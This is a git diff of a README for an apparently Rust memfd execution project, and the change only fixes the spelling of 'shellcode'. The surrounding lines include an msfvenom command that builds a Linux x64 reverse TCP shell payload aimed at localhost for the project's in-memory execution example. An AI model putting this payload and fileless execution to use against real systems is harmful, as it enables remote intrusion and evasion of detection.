@@ -33,7 +33,7 @@ Run the memfd example with an ELF file
 cargo run --example memfd_executable
 ```
 
-Run the memfd example with the provided shelcode or use your own:
+Run the memfd example with the provided shellcode or use your own:
 ```bash
 msfvenom --payload 'linux/x64/shell_reverse_tcp' LHOST=127.0.0.1 LPORT=1234 --format 'raw' --platform 'linux' --arch 'x64' --out shellcode.bin
 ```
